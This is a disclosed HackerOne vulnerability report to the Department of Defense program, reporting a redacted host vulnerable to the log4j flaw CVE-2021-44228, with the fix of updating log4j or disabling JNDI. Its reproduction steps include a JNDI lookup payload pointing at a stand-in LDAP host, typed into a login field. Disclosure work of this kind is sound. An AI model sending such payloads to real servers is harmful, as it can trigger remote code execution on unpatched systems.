---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1423496'
original_report_id: '1423496'
title: ██████████ running a vulnerable log4j
weakness: Use of Externally-Controlled Format String
team_handle: deptofdefense
created_at: '2021-12-11T00:16:38.695Z'
disclosed_at: '2022-01-19T19:33:44.463Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- use-of-externally-controlled-format-string
---

# ██████████ running a vulnerable log4j

## Metadata

- HackerOne Report ID: 1423496
- Weakness: Use of Externally-Controlled Format String
- Program: deptofdefense
- Disclosed At: 2022-01-19T19:33:44.463Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228

## Impact

Probably arbitrary code execution

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers
CVE-2021-44228

## Steps to Reproduce
1. Browse to https://████████/███████https%3A%2F%2F█████████%2F
2. Enter a `${jndi:ldap://dns-server-yoi-control/a}` into the username field
3. Enter a random password
4. Submit

Observe that a request was made to your DNS server. This strongly suggests a vulnerable log4j.

## Suggested Mitigation/Remediation Actions
Update log4j or disable jndi support.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
